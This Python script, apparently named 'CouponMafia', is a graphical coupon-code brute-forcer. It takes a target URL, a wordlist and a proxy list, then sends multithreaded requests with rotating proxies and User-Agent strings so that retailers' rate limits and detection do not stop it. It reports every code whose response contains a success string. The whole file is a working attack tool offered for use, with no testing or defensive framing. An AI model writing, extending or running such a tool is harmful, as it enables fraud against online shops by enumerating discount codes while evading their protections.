import tkinter as tk
from tkinter import filedialog, messagebox
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
import requests
import random
import time

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
]

# Function to get a random proxy
def get_random_proxy(proxy_list):
    proxy = random.choice(proxy_list).strip()
    return {"http": proxy, "https": proxy}

# Function to get a random User-Agent
def get_random_user_agent():
    return random.choice(USER_AGENTS)

# Function to validate coupon
def validate_coupon(url, coupon_code, proxy, success_indicator):
    try:
        full_url = url + coupon_code.strip()
        headers = {"User-Agent": get_random_user_agent()}
        response = requests.get(full_url, headers=headers, proxies=proxy, timeout=5)
        if success_indicator in response.text:
            return coupon_code.strip()
    except Exception as e:
        pass
    return None

# Main worker function
def start_process(url, wordlist, proxies, success_indicator, threads, output_widget):
    try:
        # Load proxies and wordlist
        with open(proxies, "r") as proxy_file:
            proxy_list = proxy_file.readlines()
        with open(wordlist, "r") as wordlist_file:
            coupon_codes = wordlist_file.readlines()

        valid_coupons = []
        with ThreadPoolExecutor(max_workers=threads) as executor:
            results = list(tqdm(
                executor.map(
                    lambda code: validate_coupon(url, code, get_random_proxy(proxy_list), success_indicator),
                    coupon_codes
                ),
                total=len(coupon_codes),
            ))

        for result in results:
            if result:
                valid_coupons.append(result)

        # Display valid coupons in the GUI
        output_widget.insert(tk.END, "Valid Coupons:\n")
        for coupon in valid_coupons:
            output_widget.insert(tk.END, coupon + "\n")

    except Exception as e:
        messagebox.showerror("Error", f"An error occurred: {e}")

# GUI Setup
def create_gui():
    root = tk.Tk()
    root.title("CouponMafia 💀")  # Updated name
    
    # Header Label
    header = tk.Label(root, text="CouponMafia 💀", font=("Helvetica", 16, "bold"), fg="red")
    header.grid(row=0, column=0, columnspan=3, pady=10)

    # Input Fields
    tk.Label(root, text="Target URL:").grid(row=1, column=0, sticky=tk.W, padx=10, pady=5)
    url_entry = tk.Entry(root, width=50)
    url_entry.grid(row=1, column=1, padx=10, pady=5)

    tk.Label(root, text="Wordlist File:").grid(row=2, column=0, sticky=tk.W, padx=10, pady=5)
    wordlist_button = tk.Button(root, text="Browse", command=lambda: wordlist_var.set(filedialog.askopenfilename()))
    wordlist_button.grid(row=2, column=2, padx=10, pady=5)
    wordlist_var = tk.StringVar()
    wordlist_entry = tk.Entry(root, textvariable=wordlist_var, width=50)
    wordlist_entry.grid(row=2, column=1, padx=10, pady=5)

    tk.Label(root, text="Proxy List File:").grid(row=3, column=0, sticky=tk.W, padx=10, pady=5)
    proxy_button = tk.Button(root, text="Browse", command=lambda: proxy_var.set(filedialog.askopenfilename()))
    proxy_button.grid(row=3, column=2, padx=10, pady=5)
    proxy_var = tk.StringVar()
    proxy_entry = tk.Entry(root, textvariable=proxy_var, width=50)
    proxy_entry.grid(row=3, column=1, padx=10, pady=5)

    tk.Label(root, text="Success Indicator:").grid(row=4, column=0, sticky=tk.W, padx=10, pady=5)
    success_entry = tk.Entry(root, width=50)
    success_entry.grid(row=4, column=1, padx=10, pady=5)

    tk.Label(root, text="Threads:").grid(row=5, column=0, sticky=tk.W, padx=10, pady=5)
    threads_entry = tk.Entry(root, width=10)
    threads_entry.grid(row=5, column=1, sticky=tk.W, padx=10, pady=5)
    threads_entry.insert(0, "10")  # Default threads

    # Output Area
    output_label = tk.Label(root, text="Output:")
    output_label.grid(row=6, column=0, sticky=tk.W, padx=10, pady=5)
    output_text = tk.Text(root, height=15, width=60)
    output_text.grid(row=7, column=0, columnspan=3, padx=10, pady=5)

    # Start Button
    def start_thread():
        url = url_entry.get()
        wordlist = wordlist_var.get()
        proxies = proxy_var.get()
        success_indicator = success_entry.get()
        threads = int(threads_entry.get())
        Thread(target=start_process, args=(url, wordlist, proxies, success_indicator, threads, output_text)).start()

    start_button = tk.Button(root, text="Start", command=start_thread, bg="green", fg="white")
    start_button.grid(row=8, column=1, pady=10)

    root.mainloop()

if __name__ == "__main__":
    create_gui()
